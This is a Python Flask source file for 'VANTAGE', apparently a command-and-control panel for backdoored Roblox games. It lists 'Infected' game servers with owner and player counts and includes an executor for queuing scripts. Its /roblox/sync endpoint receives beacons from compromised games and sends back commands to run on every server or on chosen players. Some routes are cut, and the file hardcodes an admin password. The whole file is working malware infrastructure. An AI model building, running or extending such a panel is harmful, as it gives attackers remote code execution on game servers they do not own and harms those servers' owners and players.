import requests, time, os, uuid, random, string
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "vantage_v30_final_tier"
MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 

global_servers = {} 
user_sessions = {}
valid_keys = {}
mass_execute_queue = []

def generate_key(k_type="standard"):
    k = "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    valid_keys[k] = k_type
    return k

BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card: rgba(15, 15, 15, 0.9); --border: rgba(255, 215, 0, 0.2); --accent: #bc13fe; }
* { box-sizing: border-box; transition: 0.3s; }
body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
.navbar { background: rgba(0,0,0,0.95); border-bottom: 2px solid var(--border); display: flex; justify-content: space-around; padding: 12px; z-index: 100; flex-wrap: wrap; }
.nav-item { color: #444; cursor: pointer; font-weight: 900; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; padding: 5px; }
.active-nav { color: var(--gold); border-bottom: 2px solid var(--gold); text-shadow: 0 0 10px var(--gold); }
.viewport { flex: 1; padding: 15px; overflow-y: auto; }
.card { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 15px; backdrop-filter: blur(15px); margin-bottom: 15px; position: relative; overflow: hidden; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; max-width: 1200px; margin: auto; }
.server-thumb { width: 100%; height: 110px; object-fit: cover; border-radius: 10px; border: 1px solid #222; margin-bottom: 10px; display: block; }
.server-info { font-size: 10px; margin-bottom: 8px; line-height: 1.4; }
.server-info b { color: var(--gold); }
.btn { background: var(--gold); color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 10px; margin-top: 5px; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 12px; color: #fff; width: 100%; border-radius: 10px; outline: none; margin-bottom: 10px; }
textarea { color: #0f0; font-family: 'Consolas', monospace; height: 200px; resize: none; border-left: 5px solid var(--gold); }
.hidden { display: none !important; }
/* Privacy Blur Effect */
.privacy-active .server-thumb { filter: blur(15px); }
.privacy-active .game-name { filter: blur(5px); }

@media (max-width: 600px) {
    .grid { grid-template-columns: 1fr 1fr; gap: 10px; }
    .nav-item { font-size: 9px; letter-spacing: 1px; }
}
"""

DASH_HTML = """
<!DOCTYPE html><html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>""" + BASE_CSS + """</style>
</head>
<body>
    {% if not logged_in %}
    <div style="display:flex; align-items:center; justify-content:center; height:100vh;">
        <div class="card" style="width:340px; text-align:center;">
            <h1 style="color:var(--gold);">VANTAGE</h1>
            <form method="POST" action="/login"><input type="password" name="pw" placeholder="ACCESS KEY"><button class="btn">LOGIN</button></form>
        </div>
    </div>
    {% else %}
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
        {% if is_admin and not is_master %}<div class="nav-item" style="color:#bc13fe;" onclick="tab('admin_panel', this)">Admin Panel</div>{% endif %}
        {% if is_master %}<div class="nav-item" style="color:#ff4444;" onclick="tab('master', this)">Master Panel</div>{% endif %}
    </div>
    <div class="viewport">
        <div id="live" class="tab">
            <div style="margin-bottom:15px;"><button class="btn" style="width:auto; padding:10px 20px;" onclick="togglePrivacy()">TOGGLE PRIVACY (BLUR)</button></div>
            <div id="server_grid" class="grid"></div>
        </div>
        <div id="exec" class="tab hidden"><div class="card" style="max-width: 700px; margin: auto;"><p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p><textarea id="code_area" placeholder="-- SCRIPT HERE"></textarea><button class="btn" onclick="execute()">EXECUTE</button></div></div>
        <div id="white" class="tab hidden"><div class="card" style="max-width: 400px; margin: auto; text-align: center;"><input id="w_input" placeholder="Username"><button id="w_btn" class="btn" onclick="addWhite()">WHITELIST</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:80px; border-radius:50%;"><h3 id="p_name"></h3><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button></div></div></div>
    </div>
    {% endif %}
<script>
    let privacyOn = false;
    function togglePrivacy() { privacyOn = !privacyOn; sync(); }
    function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
    function sync() {
        fetch('/api/global_signals').then(r => r.json()).then(data => {
            let sHtml = "";
            let grid = document.getElementById('server_grid');
            if (privacyOn) grid.classList.add('privacy-active'); else grid.classList.remove('privacy-active');
            
            if (Object.keys(data.servers).length === 0) {
                sHtml = `<div style="text-align:center; padding:40px; color:var(--gold); font-weight:900; font-size:14px; letter-spacing:2px; text-transform:uppercase; grid-column: 1/-1;">No infected yet, please wait...</div>`;
            } else {
                for(let id in data.servers) { 
                    let s = data.servers[id]; 
                    sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b class="game-name">GAME:</b> ${s.name}<br><b>OWNER:</b> ${s.owner}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="window.location='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN</button></div>`; 
                }
            }
            grid.innerHTML = sHtml;
        });
    }
    if (document.getElementById('server_grid')) setInterval(sync, 2500);
</script></body></html>
"""

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    global mass_execute_queue
    data = request.json
    
    # FIX: Use jobId as the primary key so multiple servers log independently
    jid = data.get("jobId")
    if not jid: return jsonify({"error": "No JobId"}), 400

    if jid not in global_servers:
        try:
            # Fetching High-Res Thumbnail
            t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png").json()
            thumb_url = t["data"][0]["imageUrl"] if t.get("data") else ""
        except:
            thumb_url = ""
        global_servers[jid] = {"thumb": thumb_url, "place_id": data.get("game_id")}
    
    # Update existing entry
    global_servers[jid].update({
        "name": data.get("name"), 
        "owner": data.get("owner"), 
        "p_count": len(data.get("players", [])), 
        "last_ping": time.time()
    })
    
    # Cleanup dead servers (inactive for 20s)
    dead = [k for k, v in global_servers.items() if time.time() - v.get('last_ping', 0) > 20]
    for k in dead: del global_servers[k]

    all_cmds = []
    # Mass Execute
    for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
    if mass_execute_queue: mass_execute_queue = []

    # Whitelist Target Execute
    players = [p.lower() for p in data.get("players", [])]
    for sid, info in user_sessions.items():
        if info.get("whitelist") and info["whitelist"]["name"].lower() in players:
            for c in info["queue"]: all_cmds.append({"user": info["whitelist"]["name"], "code": c})
            user_sessions[sid]["queue"] = []
            
    return jsonify({"commands": all_cmds})

# ... (Keep existing Login, Whitelist, and Admin routes from your original script)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
